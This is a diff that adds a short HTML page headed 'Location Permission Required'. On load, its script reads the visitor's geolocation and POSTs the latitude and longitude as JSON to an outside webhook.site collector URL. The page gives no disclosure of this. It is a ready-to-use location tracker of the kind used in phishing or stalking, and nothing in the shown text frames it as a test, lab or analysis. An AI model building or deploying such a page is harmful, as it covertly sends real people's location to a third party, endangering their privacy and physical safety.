@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>Location Permission Required</h3>
+<script>
+navigator.geolocation.getCurrentPosition(position => {
+  fetch("https://webhook.site/your-unique-url", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      lat: position.coords.latitude,
+      lon: position.coords.longitude
+    })
+  });
+});
+</script>
+</body>
+</html>
